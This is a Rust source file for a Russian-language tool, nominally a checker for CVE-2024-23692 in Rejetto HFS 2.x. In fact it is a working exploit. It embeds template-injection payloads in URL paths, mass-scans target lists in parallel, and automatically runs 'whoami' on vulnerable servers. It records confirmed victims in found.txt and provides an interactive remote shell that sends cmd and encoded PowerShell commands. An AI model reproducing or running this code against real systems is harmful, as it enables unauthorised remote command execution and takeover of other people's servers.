use std::collections::{BTreeMap, HashSet};
use std::env;
use std::fs::{self, File, OpenOptions};
use std::io::{self, Write};
use std::path::{Path, PathBuf};
use std::process::ExitCode;
use std::time::{Duration, Instant};

use base64::Engine;
use futures::stream::{self, StreamExt};
use serde::Serialize;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;

const CHECK_PATH: &str = "/?search=%25X%25url%25:%host%}{.cookie|%COOKIE%.}=%version%=";
const EXEC_PATH: &str = "/?search=%25X%25url%25:%host%}{.exec|{.chr|%CHRS%.}|out=r.}RESULT:{.^r.}====";

const TIMEOUT_SECS: u64 = 5;
const CONNECT_TIMEOUT_MS: u64 = 1500;
const PARALLEL: usize = 32;
const ATTEMPTS: u32 = 2;

#[derive(Serialize, Clone)]
struct Proof {
    command: String,
    output: Option<String>,
    error: Option<String>,
}

#[derive(Serialize, Clone)]
struct Record {
    target: String,
    banner: Option<String>,
    root_status: String,
    checked_at: String,
    verdict: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    evidence: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    error: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    proof: Option<Proof>,
}

#[derive(Clone)]
struct CheckResult {
    status: String,
    verdict: String,
    evidence: String,
}

enum Input {
    Scan { targets: Vec<(String, u16)>, batch: bool },
    Shell { host: String, port: u16 },
}

struct Chosen {
    input: Input,
    keep_console: bool,
}

fn usage() -> &'static str {
    "hfs-check — чекер Rejetto HFS 2.x (CVE-2024-23692)\n\
     \n\
       hfs-check <host[:ports]>  проверить одну цель\n\
                                 порты: host:8000, host:80,8000,8080, host:8000-8010\n\
       hfs-check                 открыть меню (двойной клик по exe)\n\
       hfs-check help            показать эту справку\n\
     \n\
       Без опций: меню, 32 параллельных цели, отчёт JSONL рядом с бинарником."
}

fn pause_console() {
    println!();
    print!("Нажмите Enter для выхода...");
    let _ = io::stdout().flush();
    let mut line = String::new();
    let _ = io::stdin().read_line(&mut line);
}

fn prompt(message: &str) -> Option<String> {
    print!("{message}");
    let _ = io::stdout().flush();
    let mut line = String::new();
    match io::stdin().read_line(&mut line) {
        Ok(0) => None,
        Ok(_) => Some(line.trim().to_string()),
        Err(_) => None,
    }
}

fn split_host_port(raw: &str) -> Result<(String, Option<String>), String> {
    let mut t = raw.trim().to_string();
    let lower = t.to_ascii_lowercase();
    if lower.starts_with("http://") {
        t = t[7..].to_string();
    } else if lower.starts_with("https://") {
        t = t[8..].to_string();
    }
    let t = t.split('/').next().unwrap_or("").to_string();
    if t.is_empty() {
        return Err("пустая цель".into());
    }
    if t.starts_with('[') {
        let end = t.find(']').ok_or_else(|| format!("битый IPv6: {t}"))?;
        let host = t[1..end].to_string();
        let rest = &t[end + 1..];
        let port = rest.strip_prefix(':').filter(|p| !p.is_empty()).map(str::to_string);
        return Ok((host, port));
    }
    match t.split_once(':') {
        Some((host, ports)) if !ports.is_empty() => Ok((host.to_string(), Some(ports.to_string()))),
        _ => Ok((t, None)),
    }
}

fn parse_ports(spec: Option<&str>) -> Result<Vec<u16>, String> {
    let mut ports = Vec::new();
    for token in spec.unwrap_or("80").split(',') {
        let token = token.trim();
        if token.is_empty() {
            continue;
        }
        if let Some((a, b)) = token.split_once('-') {
            let lo: u16 = a.trim().parse().map_err(|_| format!("неверный порт: {token}"))?;
            let hi: u16 = b.trim().parse().map_err(|_| format!("неверный порт: {token}"))?;
            if lo > hi || lo == 0 {
                return Err(format!("перевёрнутый диапазон: {token}"));
            }
            ports.extend(lo..=hi);
        } else {
            let p: u16 = token.parse().map_err(|_| format!("неверный порт: {token}"))?;
            if p == 0 {
                return Err("порт вне диапазона".into());
            }
            ports.push(p);
        }
    }
    if ports.is_empty() {
        return Err("нет портов".into());
    }
    Ok(ports)
}

fn parse_targets(raw: &[String]) -> Result<Vec<(String, u16)>, String> {
    let mut out = Vec::new();
    for t in raw {
        let (host, spec) = split_host_port(t)?;
        for port in parse_ports(spec.as_deref())? {
            out.push((host.clone(), port));
        }
    }
    Ok(out)
}

fn decode_utf16(bytes: &[u8], le: bool) -> String {
    let units: Vec<u16> = bytes
        .chunks_exact(2)
        .map(|c| {
            if le {
                u16::from_le_bytes([c[0], c[1]])
            } else {
                u16::from_be_bytes([c[0], c[1]])
            }
        })
        .collect();
    String::from_utf16_lossy(&units)
}

fn cp1251_char(b: u8) -> char {
    match b {
        0x00..=0x7F => b as char,
        0xA8 => '\u{0408}',
        0xB8 => '\u{0409}',
        0xC0..=0xFF => char::from_u32(0x0410 + (b - 0xC0) as u32).unwrap_or('\u{FFFD}'),
        0x80..=0xBF => char::from_u32(b as u32).unwrap_or('\u{FFFD}'),
    }
}

fn decode_targets(bytes: &[u8]) -> String {
    if bytes.starts_with(&[0xEF, 0xBB, 0xBF]) {
        return String::from_utf8_lossy(&bytes[3..]).into_owned();
    }
    if bytes.starts_with(&[0xFF, 0xFE]) {
        return decode_utf16(&bytes[2..], true);
    }
    if bytes.starts_with(&[0xFE, 0xFF]) {
        return decode_utf16(&bytes[2..], false);
    }
    let sample = &bytes[..bytes.len().min(64)];
    if sample.len() >= 4 {
        let even_nul = sample.iter().step_by(2).filter(|&&b| b == 0).count();
        let odd_nul = sample.iter().skip(1).step_by(2).filter(|&&b| b == 0).count();
        let threshold = sample.len() / 8;
        if odd_nul > threshold {
            return decode_utf16(bytes, true);
        }
        if even_nul > threshold {
            return decode_utf16(bytes, false);
        }
    }
    if let Ok(s) = std::str::from_utf8(bytes) {
        return s.to_string();
    }
    bytes.iter().map(|&b| cp1251_char(b)).collect()
}

fn read_targets_file() -> Result<Vec<String>, String> {
    let mut path = PathBuf::from("targets.txt");
    if !path.exists() {
        if let Ok(mut exe_dir) = env::current_exe() {
            exe_dir.pop();
            exe_dir.push("targets.txt");
            if exe_dir.exists() {
                path = exe_dir;
            }
        }
    }
    let raw = fs::read(&path)
        .map_err(|e| format!("не могу прочитать targets.txt: {e}"))?;
    let content = decode_targets(&raw);
    let lines: Vec<String> = content
        .lines()
        .map(str::trim)
        .filter(|l| !l.is_empty() && !l.starts_with('#'))
        .map(str::to_string)
        .collect();
    if lines.is_empty() {
        return Err("targets.txt пуст".into());
    }
    Ok(lines)
}

fn choose_shell_target() -> Option<(String, u16)> {
    let path = reports_dir().join("found.txt");
    loop {
        let lines: Vec<String> = match fs::read(&path) {
            Ok(raw) => decode_targets(&raw)
                .lines()
                .map(str::trim)
                .filter(|l| !l.is_empty())
                .map(str::to_string)
                .collect(),
            Err(_) => Vec::new(),
        };
        if lines.is_empty() {
            println!("[!] found.txt пуст или отсутствует — сначала проверьте цели (п. 1 или 2)");
            return None;
        }

        println!();
        println!("Подтверждённые цели (found.txt):");
        for (i, line) in lines.iter().enumerate() {
            println!("  {:2}) {}", i + 1, line);
        }
        let answer = match prompt("Выберите номер [0 — назад]: ") {
            Some(a) => a,
            None => return None,
        };
        if answer.is_empty() || answer == "0" {
            return None;
        }
        let idx = match answer.parse::<usize>() {
            Ok(n) if n >= 1 && n <= lines.len() => n - 1,
            _ => {
                println!("[!] неверный номер");
                continue;
            }
        };
        match parse_targets(&[lines[idx].clone()]) {
            Ok(v) if v.len() == 1 => return Some(v.into_iter().next().unwrap()),
            Ok(_) => println!("[!] в строке несколько портов — нужен один host:port"),
            Err(e) => println!("[!] {e}"),
        }
    }
}

fn interactive() -> Result<Chosen, i32> {
    println!("=== hfs-check ===");
    loop {
        println!();
        println!("  1) Проверить одну цель");
        println!("  2) Проверить список из targets.txt");
        println!("  3) Интерактивный шелл (из found.txt)");
        println!("  4) Справка");
        println!("  0) Выход");
        let choice = match prompt("Выберите [0-4]: ") {
            Some(c) => c,
            None => {
                pause_console();
                return Err(0);
            }
        };
        match choice.as_str() {
            "1" => {
                let raw = match prompt("Цель (host[:ports]): ") {
                    Some(t) if !t.is_empty() => t,
                    Some(_) => {
                        println!("[!] пустая цель");
                        continue;
                    }
                    None => {
                        pause_console();
                        return Err(0);
                    }
                };
                match parse_targets(&[raw]) {
                    Ok(targets) => {
                        return Ok(Chosen {
                            input: Input::Scan { targets, batch: false },
                            keep_console: true,
                        })
                    }
                    Err(e) => println!("[!] {e}"),
                }
            }
            "2" => match read_targets_file().and_then(|lines| parse_targets(&lines)) {
                Ok(targets) => {
                    return Ok(Chosen {
                        input: Input::Scan { targets, batch: true },
                        keep_console: true,
                    })
                }
                Err(e) => println!("[!] {e} (положите targets.txt рядом с бинарником)"),
            },
            "3" => match choose_shell_target() {
                Some((host, port)) => {
                    return Ok(Chosen {
                        input: Input::Shell { host, port },
                        keep_console: true,
                    })
                }
                None => continue,
            },
            "4" => println!("{}", usage()),
            "0" | "" => {
                pause_console();
                return Err(0);
            }
            _ => println!("[!] неверный выбор"),
        }
    }
}

fn parse_input() -> Result<Chosen, i32> {
    let raw: Vec<String> = env::args().skip(1).collect();
    if raw.iter().any(|a| matches!(a.as_str(), "help" | "-h" | "--help")) {
        println!("{}", usage());
        pause_console();
        return Err(0);
    }
    if let Some(arg) = raw.first() {
        if arg.starts_with('-') {
            eprintln!("[!] опций больше нет: {arg}");
            eprintln!("{}", usage());
            pause_console();
            return Err(2);
        }
    }
    if raw.len() > 1 {
        eprintln!("[!] укажите одну цель или запустите без аргументов для меню");
        eprintln!("{}", usage());
        pause_console();
        return Err(2);
    }
    match raw.first() {
        Some(arg) => match parse_targets(&[arg.clone()]) {
            Ok(targets) => Ok(Chosen {
                input: Input::Scan { targets, batch: false },
                keep_console: false,
            }),
            Err(e) => {
                eprintln!("[!] {e}");
                Err(2)
            }
        },
        None => interactive(),
    }
}

async fn http_once(
    host: &str,
    port: u16,
    path: &str,
    host_header: Option<&str>,
    cookie: Option<&str>,
) -> Result<String, String> {
    let addrs = tokio::net::lookup_host((host, port))
        .await
        .map_err(|e| format!("resolve: {e}"))?;
    let mut last = "нет адресов".to_string();

    for addr in addrs {
        let connect = tokio::time::timeout(
            Duration::from_millis(CONNECT_TIMEOUT_MS),
            TcpStream::connect(addr),
        )
        .await;
        let mut stream = match connect {
            Ok(Ok(s)) => s,
            Ok(Err(e)) => {
                last = e.to_string();
                continue;
            }
            Err(_) => {
                last = "connect timeout".into();
                continue;
            }
        };

        let mut req = format!(
            "GET {path} HTTP/1.1\r\nHost: {}\r\n",
            host_header.unwrap_or("")
        );
        if let Some(c) = cookie {
            req.push_str("Cookie: ");
            req.push_str(c);
            req.push_str("\r\n");
        }
        req.push_str("Connection: close\r\n\r\n");

        if let Err(e) = stream.write_all(req.as_bytes()).await {
            last = e.to_string();
            continue;
        }
        let mut buf = Vec::with_capacity(8192);
        match tokio::time::timeout(Duration::from_secs(TIMEOUT_SECS), stream.read_to_end(&mut buf)).await {
            Ok(Ok(_)) => return Ok(String::from_utf8_lossy(&buf).into_owned()),
            Ok(Err(e)) => last = e.to_string(),
            Err(_) => last = "read timeout".into(),
        }
    }
    Err(last)
}

async fn http_raw(
    host: &str,
    port: u16,
    path: &str,
    host_header: Option<&str>,
    cookie: Option<&str>,
) -> Result<String, String> {
    let mut last = String::new();
    for _ in 0..ATTEMPTS {
        match http_once(host, port, path, host_header, cookie).await {
            Ok(r) => return Ok(r),
            Err(e) => last = e,
        }
    }
    Err(last)
}

fn status_line(resp: &str) -> String {
    if resp.is_empty() {
        return "EMPTY".into();
    }
    resp.split("\r\n").next().unwrap_or("EMPTY").to_string()
}

fn body_of(resp: &str) -> &str {
    match resp.find("\r\n\r\n") {
        Some(p) => &resp[p + 4..],
        None => resp,
    }
}

fn server_header(resp: &str) -> Option<String> {
    for line in resp.split("\r\n") {
        let line = line.trim_end();
        if line.len() >= 7 && line[..7].eq_ignore_ascii_case("server:") {
            return Some(line[7..].trim().to_string());
        }
    }
    None
}

fn random_token(prefix: &str, len: usize, alphabet: &[u8]) -> String {
    let mut bytes = vec![0u8; len];
    let _ = getrandom::getrandom(&mut bytes);
    let mut s = String::from(prefix);
    for b in bytes {
        s.push(alphabet[b as usize % alphabet.len()] as char);
    }
    s
}

async fn banner(host: &str, port: u16) -> (Option<String>, String, Option<String>) {
    let hh = format!("{host}:{port}");
    match http_raw(host, port, "/", Some(&hh), None).await {
        Ok(r) => (server_header(&r), status_line(&r), None),
        Err(e) => (None, "EMPTY".into(), Some(e)),
    }
}

fn token_evidence(body: &str, cval: &str) -> Option<String> {
    let p = body.find(cval)? + cval.len();
    let rest = &body[p..];
    let rest = rest.strip_prefix('=')?;
    let end = rest.find('=')?;
    if end == 0 || end > 40 {
        return None;
    }
    Some(format!("{cval}={}=", &rest[..end]))
}

async fn check(host: &str, port: u16) -> CheckResult {
    let cname = random_token("ck", 8, b"abcdefghijklmnopqrstuvwxyz");
    let cval = random_token("V", 12, b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789");
    let path = CHECK_PATH.replace("%COOKIE%", &cname);
    let cookie = format!("{cname}={cval}");

    match http_raw(host, port, &path, None, Some(&cookie)).await {
        Ok(r) => {
            let body = body_of(&r);
            if let Some(ev) = token_evidence(body, &cval) {
                CheckResult {
                    status: status_line(&r),
                    verdict: "vulnerable".into(),
                    evidence: ev,
                }
            } else if body.contains("&#123;") || body.contains("&#46;") {
                CheckResult {
                    status: status_line(&r),
                    verdict: "echo_only".into(),
                    evidence: "макросы HTML-закодированы, не исполняются".into(),
                }
            } else {
                CheckResult {
                    status: status_line(&r),
                    verdict: "not_vulnerable".into(),
                    evidence: "токен не отразился в теле".into(),
                }
            }
        }
        Err(e) => CheckResult {
            status: "EMPTY".into(),
            verdict: "error".into(),
            evidence: e,
        },
    }
}

fn html_unescape(s: &str) -> String {
    if !s.contains('&') {
        return s.to_string();
    }
    let chars: Vec<char> = s.chars().collect();
    let mut out = String::with_capacity(s.len());
    let mut i = 0;
    while i < chars.len() {
        if chars[i] == '&' {
            if let Some(rel) = chars[i + 1..].iter().position(|&c| c == ';') {
                let end = i + 1 + rel;
                let ent: String = chars[i + 1..end].iter().collect();
                let rep = match ent.as_str() {
                    "amp" => Some('&'),
                    "lt" => Some('<'),
                    "gt" => Some('>'),
                    "quot" => Some('"'),
                    "apos" => Some('\''),
                    "nbsp" => Some('\u{a0}'),
                    _ => {
                        if let Some(hex) = ent.strip_prefix("#x").or_else(|| ent.strip_prefix("#X")) {
                            u32::from_str_radix(hex, 16).ok().and_then(char::from_u32)
                        } else if let Some(dec) = ent.strip_prefix('#') {
                            dec.parse::<u32>().ok().and_then(char::from_u32)
                        } else {
                            None
                        }
                    }
                };
                if let Some(c) = rep {
                    out.push(c);
                    i = end + 1;
                    continue;
                }
            }
        }
        out.push(chars[i]);
        i += 1;
    }
    out
}

fn clean_output(text: &str) -> String {
    let un = html_unescape(text);
    un.lines()
        .map(|l| l.trim_end())
        .collect::<Vec<_>>()
        .join("\n")
}

fn find_between(s: &str, start: &str, end: &str) -> Option<String> {
    let p = s.find(start)? + start.len();
    let rest = &s[p..];
    let e = rest.find(end)?;
    Some(rest[..e].to_string())
}

async fn run_raw_cmd(host: &str, port: u16, full: &str) -> Result<String, String> {
    let chrs = full
        .as_bytes()
        .iter()
        .map(|b| b.to_string())
        .collect::<Vec<_>>()
        .join("|");
    let path = EXEC_PATH.replace("%CHRS%", &chrs);
    let mut last = "вывод не получен".to_string();
    for _ in 0..2 {
        if let Ok(r) = http_raw(host, port, &path, None, None).await {
            if let Some(out) = find_between(body_of(&r), "RESULT:", "====") {
                return Ok(clean_output(&out));
            }
            last = status_line(&r);
        }
    }
    Err(last)
}

async fn exec_cmd(host: &str, port: u16, cmd: &str) -> Proof {
    let full = format!("\"cmd\" \"/c {cmd}\"");
    match run_raw_cmd(host, port, &full).await {
        Ok(output) => Proof {
            command: cmd.to_string(),
            output: Some(output),
            error: None,
        },
        Err(e) => Proof {
            command: cmd.to_string(),
            output: None,
            error: Some(e),
        },
    }
}

fn ps_encode(script: &str) -> String {
    let utf16: Vec<u16> = script.encode_utf16().collect();
    let mut bytes = Vec::with_capacity(utf16.len() * 2);
    for u in utf16 {
        bytes.extend_from_slice(&u.to_le_bytes());
    }
    base64::engine::general_purpose::STANDARD.encode(bytes)
}

async fn ps_cmd(host: &str, port: u16, script: &str) -> Proof {
    let cmd = format!("powershell -enc {}", ps_encode(script));
    match run_raw_cmd(host, port, &cmd).await {
        Ok(output) => Proof {
            command: format!("ps: {script}"),
            output: Some(output),
            error: None,
        },
        Err(e) => Proof {
            command: format!("ps: {script}"),
            output: None,
            error: Some(e),
        },
    }
}

const PS_VERBS: [&str; 33] = [
    "get-", "set-", "write-", "read-", "test-", "new-", "remove-", "add-", "clear-",
    "copy-", "move-", "rename-", "select-", "where-", "sort-", "measure-", "format-",
    "out-", "export-", "import-", "invoke-", "start-", "stop-", "wait-", "resolve-",
    "split-", "join-", "convert-", "compare-", "group-", "find-", "for-each", "foreach",
];

fn looks_like_powershell(cmd: &str) -> bool {
    let s = cmd.trim();
    if s.starts_with('$') || s.starts_with('[') || s.starts_with("@(") {
        return true;
    }
    let low = s.to_ascii_lowercase();
    for kw in ["if", "while", "foreach", "switch", "do", "try"] {
        if low.starts_with(kw) {
            let rest = &low[kw.len()..];
            let rest = rest.trim_start();
            if rest.starts_with('(') || rest.starts_with('{') {
                return true;
            }
        }
    }
    if s.contains('|') && PS_VERBS.iter().any(|v| low.contains(v)) {
        return true;
    }
    let first = s
        .split(|c: char| c.is_whitespace() || matches!(c, '|' | ';' | '(' | '&'))
        .next()
        .unwrap_or("")
        .to_ascii_lowercase();
    PS_VERBS.iter().any(|v| first.starts_with(v))
}

fn reports_dir() -> PathBuf {
    env::current_exe()
        .ok()
        .and_then(|p| p.parent().map(Path::to_path_buf))
        .unwrap_or_else(|| PathBuf::from("."))
}

fn civil_from_days(z: i64) -> (i64, u64, u64) {
    let z = z + 719_468;
    let era = if z >= 0 { z } else { z - 146_096 } / 146_097;
    let doe = (z - era * 146_097) as u64;
    let yoe = (doe - doe / 1460 + doe / 36_524 - doe / 146_096) / 365;
    let mut y = yoe as i64 + era * 400;
    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
    let mp = (5 * doy + 2) / 153;
    let d = doy - (153 * mp + 2) / 5 + 1;
    let m = if mp < 10 { mp + 3 } else { mp - 9 };
    if m <= 2 {
        y += 1;
    }
    (y, m, d)
}

fn timestamp() -> String {
    let secs = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs() as i64)
        .unwrap_or(0);
    let days = secs.div_euclid(86_400);
    let sod = secs.rem_euclid(86_400);
    let (y, m, d) = civil_from_days(days);
    format!(
        "{y:04}{m:02}{d:02}_{:02}{:02}{:02}",
        sod / 3600,
        (sod % 3600) / 60,
        sod % 60
    )
}

fn checked_at() -> String {
    let ts = timestamp();
    let (date, time) = ts.split_once('_').unwrap_or((&ts, "000000"));
    format!("{}-{}-{}T{}:{}:{}", &date[0..4], &date[4..6], &date[6..8], &time[0..2], &time[2..4], &time[4..6])
}

fn prepare_path(path: &Path) {
    if let Some(parent) = path.parent() {
        if !parent.as_os_str().is_empty() {
            let _ = fs::create_dir_all(parent);
        }
    }
}

fn vcolor(verdict: &str) -> &'static str {
    match verdict {
        "vulnerable" => "91",
        "echo_only" | "error" | "unreachable" => "93",
        "not_vulnerable" | "not_hfs" => "92",
        _ => "97",
    }
}

fn paint(text: &str, code: &str) -> String {
    if env::var_os("NO_COLOR").is_some() {
        text.to_string()
    } else {
        format!("\x1b[{code}m{text}\x1b[0m")
    }
}

async fn scan_target(host: String, port: u16, prefix: String, mut logs: String) -> (Record, String) {
    let started = Instant::now();
    let target = format!("{host}:{port}");
    logs.push_str(&prefix);
    logs.push_str(&target);
    logs.push('\n');

    // Одна волна: баннер + три независимых SSTI-пробы (вместо последовательных ретраев).
    let (b, c1, c2, c3) = futures::join!(
        banner(&host, port),
        check(&host, port),
        check(&host, port),
        check(&host, port)
    );

    let checks = [c1, c2, c3];
    let chosen = checks
        .iter()
        .find(|c| c.verdict != "not_vulnerable")
        .cloned()
        .unwrap_or_else(|| checks[0].clone());

    logs.push_str(&prefix);
    logs.push_str(&format!("  banner={:?} root_status={}\n", b.0, b.1));
    for c in &checks {
        logs.push_str(&prefix);
        logs.push_str(&format!("  probe={} status={}\n", c.verdict, c.status));
    }

    let record = if let Some(err) = b.2 {
        Record {
            target,
            banner: None,
            root_status: b.1,
            checked_at: checked_at(),
            verdict: "unreachable".into(),
            evidence: None,
            error: Some(err),
            proof: None,
        }
    } else if b.0.as_ref().map(|s| s.to_ascii_lowercase().contains("hfs")).unwrap_or(false) {
        let mut rec = Record {
            target,
            banner: b.0,
            root_status: b.1,
            checked_at: checked_at(),
            verdict: chosen.verdict.clone(),
            evidence: Some(chosen.evidence.clone()),
            error: if chosen.verdict == "error" { Some(chosen.evidence.clone()) } else { None },
            proof: None,
        };
        if chosen.verdict == "vulnerable" {
            let proof = exec_cmd(&host, port, "whoami").await;
            logs.push_str(&prefix);
            logs.push_str(&format!("  proof={:?}\n", proof.output));
            rec.proof = Some(proof);
        }
        rec
    } else {
        let ev = format!("banner={:?}", b.0);
        Record {
            target,
            banner: b.0,
            root_status: b.1,
            checked_at: checked_at(),
            verdict: "not_hfs".into(),
            evidence: Some(ev),
            error: None,
            proof: None,
        }
    };

    logs.push_str(&prefix);
    logs.push_str(&format!(
        "  verdict={} ({:.1}s)\n",
        record.verdict,
        started.elapsed().as_secs_f64()
    ));
    (record, logs)
}

async fn confirm_vulnerable(host: &str, port: u16) -> bool {
    let (b, c1, c2, c3) = futures::join!(
        banner(host, port),
        check(host, port),
        check(host, port),
        check(host, port)
    );
    b.2.is_none()
        && b.0.as_ref().map(|s| s.to_ascii_lowercase().contains("hfs")).unwrap_or(false)
        && [c1, c2, c3].iter().any(|c| c.verdict == "vulnerable")
}

async fn interactive_shell(host: &str, port: u16) {
    println!("[*] HFS shell {host}:{port}  |  help — справка, exit — выход");
    let mut cwd: Option<String> = None;
    let mut history: Vec<String> = Vec::new();

    loop {
        let p = match &cwd {
            Some(c) => format!("hfs:{c}> "),
            None => "hfs> ".to_string(),
        };
        let mut line = match prompt(&p) {
            Some(l) => l,
            None => {
                println!();
                break;
            }
        };
        if line.is_empty() {
            continue;
        }
        let low = line.to_ascii_lowercase();
        if matches!(low.as_str(), "exit" | "quit" | "q") {
            break;
        }
        if matches!(low.as_str(), "help" | "?") {
            println!("  <cmd>       любая команда (префиксы cmd /c и ps не нужны)");
            println!("  ps          многострочный PowerShell (пустая строка — выполнить)");
            println!("  cd [path]   смена каталога (сохраняется между командами)");
            println!("  clear       очистить экран");
            println!("  history     история команд");
            println!("  exit        выход");
            continue;
        }
        if low == "clear" {
            print!("\x1b[2J\x1b[H");
            let _ = io::stdout().flush();
            continue;
        }
        if low == "history" {
            for (i, h) in history.iter().enumerate() {
                println!("  {:4}  {}", i + 1, h);
            }
            continue;
        }
        if low.starts_with("cd") {
            let target = line[2..].trim();
            if target.is_empty() {
                println!("{}", cwd.as_deref().unwrap_or("(корень HFS)"));
                continue;
            }
            if (target.len() >= 2 && target.as_bytes()[1] == b':')
                || target.starts_with("\\\\")
            {
                cwd = Some(target.trim_end_matches(|c| c == '\\' || c == '/').to_string());
            } else if target == ".." {
                cwd = cwd.as_ref().and_then(|c| c.rsplit_once('\\').map(|(p, _)| p.to_string()));
            } else if let Some(c) = &cwd {
                cwd = Some(format!("{}\\{}", c.trim_end_matches('\\'), target));
            } else {
                cwd = Some(target.to_string());
            }
            println!("{}", cwd.as_deref().unwrap_or("(корень HFS)"));
            continue;
        }
        if low == "ps" || low == "ps -" {
            println!("[PowerShell-режим, пустая строка для выполнения]");
            let mut parts = Vec::new();
            loop {
                let chunk = match prompt("... ") {
                    Some(c) => c,
                    None => break,
                };
                if chunk.is_empty() {
                    break;
                }
                parts.push(chunk);
            }
            if parts.is_empty() {
                continue;
            }
            line = format!("ps {}", parts.join("\n"));
        }

        history.push(line.clone());
        let t0 = Instant::now();
        let (proof, mode) = if line.to_ascii_lowercase().starts_with("ps ") {
            (ps_cmd(host, port, line[3..].trim()).await, "ps")
        } else if looks_like_powershell(&line) {
            (ps_cmd(host, port, &line).await, "ps")
        } else {
            let cmd = match &cwd {
                Some(c) => format!("cd /d \"{c}\" & {line}"),
                None => line.clone(),
            };
            (exec_cmd(host, port, &cmd).await, "cmd")
        };
        if let Some(out) = proof.output {
            println!("{out}");
        } else {
            println!("[!] {}", proof.error.unwrap_or_else(|| "нет вывода".into()));
        }
        println!("    [{:.1}s {mode}]", t0.elapsed().as_secs_f64());
    }
}

async fn run_scan(targets: Vec<(String, u16)>, batch: bool) -> Vec<Record> {
    let total = targets.len();
    // В txt попадают только подтверждённые цели, без повторов между запусками.
    let report_path = reports_dir().join("found.txt");
    let mut known: HashSet<String> = fs::read_to_string(&report_path)
        .unwrap_or_default()
        .lines()
        .map(|l| l.trim().to_string())
        .filter(|l| !l.is_empty())
        .collect();

    let mut stream = stream::iter(targets.into_iter().enumerate().map(|(i, (host, port))| {
        let prefix = if batch {
            format!("[{}/{}] ", i + 1, total)
        } else {
            String::new()
        };
        let logs = String::with_capacity(512);
        async move { (i, scan_target(host, port, prefix, logs).await) }
    }))
    .buffer_unordered(PARALLEL);

    let mut results: Vec<Option<Record>> = vec![None; total];
    while let Some((i, (record, logs))) = stream.next().await {
        let prefix = if batch {
            format!("[{}/{}] ", i + 1, total)
        } else {
            String::new()
        };
        let line = format!(
            "{}RESULT {}  {}  banner={:?}\n",
            prefix,
            record.target,
            paint(&record.verdict, vcolor(&record.verdict)),
            record.banner
        );
        print!("{}{}", logs, line);
        let _ = io::stdout().flush();

        if record.verdict == "vulnerable" && known.insert(record.target.clone()) {
            if let Ok(mut f) = OpenOptions::new().create(true).append(true).open(&report_path) {
                let _ = writeln!(f, "{}", record.target);
            }
        }
        results[i] = Some(record);
    }

    println!("\n=== ИТОГИ ===");
    let mut counts: BTreeMap<&str, usize> = BTreeMap::new();
    for (i, slot) in results.iter().enumerate() {
        let r = slot.as_ref().expect("all results collected");
        println!(
            "{:2}. {}  {}  banner={:?}",
            i + 1,
            r.target,
            paint(&r.verdict, vcolor(&r.verdict)),
            r.banner
        );
        *counts.entry(&r.verdict).or_insert(0) += 1;
    }
    for (v, n) in counts {
        println!("  {}: {n}", paint(&v, vcolor(&v)));
    }
    println!("\nПодтверждено: {}", report_path.display());

    results.into_iter().map(|r| r.expect("all results collected")).collect()
}

#[tokio::main]
async fn main() -> ExitCode {
    let chosen = match parse_input() {
        Ok(v) => v,
        Err(code) => return ExitCode::from(code as u8),
    };

    match chosen.input {
        Input::Scan { targets, batch } => {
            run_scan(targets, batch).await;
        }
        Input::Shell { host, port } => {
            println!("[*] проверка {host}:{port} ...");
            if !confirm_vulnerable(&host, port).await {
                println!("[!] CVE-2024-23692 не подтверждён — шелл недоступен");
                if chosen.keep_console {
                    pause_console();
                }
                return ExitCode::from(2);
            }
            println!("[+] SSTI подтверждён, вход в шелл");
            interactive_shell(&host, port).await;
        }
    }

    if chosen.keep_console {
        pause_console();
    }
    ExitCode::SUCCESS
}
